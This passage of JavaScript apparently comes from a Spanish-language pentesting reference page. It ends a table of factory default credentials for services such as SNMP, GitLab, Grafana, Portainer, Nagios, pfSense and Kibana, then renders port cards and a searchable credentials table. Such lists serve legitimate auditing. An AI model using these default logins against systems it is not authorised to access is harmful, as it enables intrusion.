  {s:'SNMP',u:'',p:'public',n:'Community string read'},{s:'SNMP',u:'',p:'private',n:'Community string write'},
  {s:'Webmin',u:'root',p:'root',n:'Usa credenciales del sistema'},{s:'Webmin',u:'admin',p:'admin',n:'Sin configurar'},
  {s:'Grafana',u:'admin',p:'admin',n:'Por defecto'},
  {s:'GitLab',u:'root',p:'5iveL!fe',n:'Versiones antiguas'},{s:'Gitea',u:'admin',p:'admin',n:'Sin configurar'},
  {s:'Portainer',u:'admin',p:'admin',n:'Sin configurar'},{s:'Portainer',u:'admin',p:'portainer',n:'Alternativo'},
  {s:'Nagios',u:'nagiosadmin',p:'nagios',n:'Por defecto'},{s:'Nagios',u:'admin',p:'admin',n:'Nagios XI'},
  {s:'pfSense',u:'admin',p:'pfsense',n:'Panel web'},{s:'Kibana',u:'elastic',p:'changeme',n:'Con X-Pack'},
  {s:'Memcached',u:'',p:'',n:'Sin auth por defecto'},{s:'IIS',u:'IUSR',p:'',n:'Usuario anónimo de IIS'},
];

var ptSelected = [];

function renderGrid() {
  var q = document.getElementById('pt-filter').value.toLowerCase();
  var html = '';
  PORTS.forEach(function(p) {
    var sel = ptSelected.indexOf(p.port) >= 0;
    var vis = !q || p.port.toString().includes(q) || p.name.toLowerCase().includes(q) || p.desc.toLowerCase().includes(q);
    html += '<button class="pt-btn' + (sel?' selected':'') + (vis?'':' pt-hidden') + '" onclick="ptToggle(' + p.port + ')">';
    html += '<span class="pnum">' + p.port + '</span><span class="pname">' + p.name + '</span></button>';
  });
  document.getElementById('pt-grid').innerHTML = html;
}

function renderDetail() {
  var el = document.getElementById('pt-detail');
  var div = document.getElementById('pt-divider');
  if (ptSelected.length === 0) {
    el.innerHTML = '<div class="pt-empty">Selecciona uno o más puertos para ver su información</div>';
    div.style.display = 'none'; return;
  }
  div.style.display = 'block';
  var html = '';
  ptSelected.forEach(function(port) {
    var p = PORTS.find(function(x){ return x.port === port; });
    html += '<div class="cs-card">';
    html += '<div class="cs-card-header" style="cursor:default">';
    html += '<div class="pt-port-badge">' + p.port + '</div>';
    html += '<div style="flex:1"><h3>' + p.name + ' <span style="font-size:12px;font-weight:400;color:var(--text-muted)">' + p.proto + '</span></h3><p>' + p.desc + '</p></div>';
    html += '<div class="pt-proto">' + p.proto + '</div>';
    html += '<button class="pt-remove" onclick="ptRemove(' + p.port + ')">✕</button>';
    html += '</div>';
    html += '<div class="cs-body" style="display:block"><div class="cs-grid">';
    html += '<div class="cs-section"><h4>Servicios</h4><ul>' + p.services.map(function(s){ return '<li>'+s+'</li>'; }).join('') + '</ul></div>';
    html += '<div class="cs-section"><h4>Vulnerabilidades</h4><ul>' + p.vulns.map(function(v){ return '<li><span class="cs-tag-vuln">'+v+'</span></li>'; }).join('') + '</ul></div>';
    html += '<div class="cs-section full"><h4>Herramientas y comandos</h4><ul>' + p.tools.map(function(t){ return '<li><span class="cs-cmd">'+t+'</span></li>'; }).join('') + '</ul></div>';
    html += '<div class="cs-tip"><strong>Tip</strong>' + p.tip + '</div>';
    html += '</div></div></div>';
  });
  el.innerHTML = html;
}

function ptToggle(port) {
  var idx = ptSelected.indexOf(port);
  if (idx >= 0) ptSelected.splice(idx, 1); else ptSelected.push(port);
  renderGrid(); renderDetail();
}
function ptRemove(port) {
  ptSelected = ptSelected.filter(function(p){ return p !== port; });
  renderGrid(); renderDetail();
}

document.getElementById('pt-filter').addEventListener('input', renderGrid);
document.getElementById('pt-clear-btn').addEventListener('click', function() {
  ptSelected = []; document.getElementById('pt-filter').value = '';
  renderGrid(); renderDetail();
});

function switchMain(e, tab) {
  document.querySelectorAll('.cs-main-tab').forEach(function(t){ t.classList.remove('active'); });
  document.querySelectorAll('.cs-main-panel').forEach(function(p){ p.classList.remove('active'); });
  e.target.classList.add('active');
  document.getElementById('panel-' + tab).classList.add('active');
}

function toggleCard(id) { document.getElementById(id).classList.toggle('open'); }

function filterCards(panel, q) {
  document.querySelectorAll('#list-' + panel + ' .cs-card').forEach(function(card) {
    card.classList.toggle('cs-hidden', q && !card.textContent.toLowerCase().includes(q.toLowerCase()));
  });
}

function renderCreds(data) {
  document.getElementById('cred-body').innerHTML = data.map(function(c) {
    return '<tr><td><span class="cs-service-label">' + c.s + '</span></td>' +
      '<td>' + (c.u || '<span style="color:var(--text-dim)">—</span>') + '</td>' +
      '<td>' + (c.p || '<span style="color:var(--text-dim)">vacía</span>') + '</td>' +
      '<td style="color:var(--text-muted);font-family:var(--sans);font-size:11px">' + c.n + '</td></tr>';
  }).join('');
}

function filterCreds(q) {
  renderCreds(CREDS.filter(function(c) {
    return (c.s+c.u+c.p+c.n).toLowerCase().includes(q.toLowerCase());
  }));
}

renderGrid();
renderDetail();
renderCreds(CREDS);
</script>
